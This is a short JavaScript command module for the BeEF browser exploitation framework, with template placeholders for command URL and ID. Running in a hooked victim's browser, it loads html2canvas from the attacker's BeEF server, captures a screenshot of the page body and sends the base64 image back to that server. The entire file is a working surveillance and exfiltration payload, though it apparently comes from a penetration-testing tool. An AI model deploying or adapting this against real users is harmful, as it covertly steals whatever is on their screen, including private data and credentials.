

beef.execute(function() {

	var script = document.createElement( 'script' );
	script.type = 'text/javascript';
	script.src = beef.net.httpproto+'://'+beef.net.host+':'+beef.net.port+'/html2canvas.js';
	$j("body").append( script );

	html2canvas(document.body, {
	  onrendered: function(canvas) {

        var img = canvas.toDataURL("image/png");
        var output = img.replace(/^data:image\/(png|jpg);base64,/, "");

    	beef.net.send("<%= @command_url %>", <%= @command_id %>, output);
    	//beef.net.send("<%= @command_url %>", <%= @command_id %>, "image=All done");

	  }
	});				


});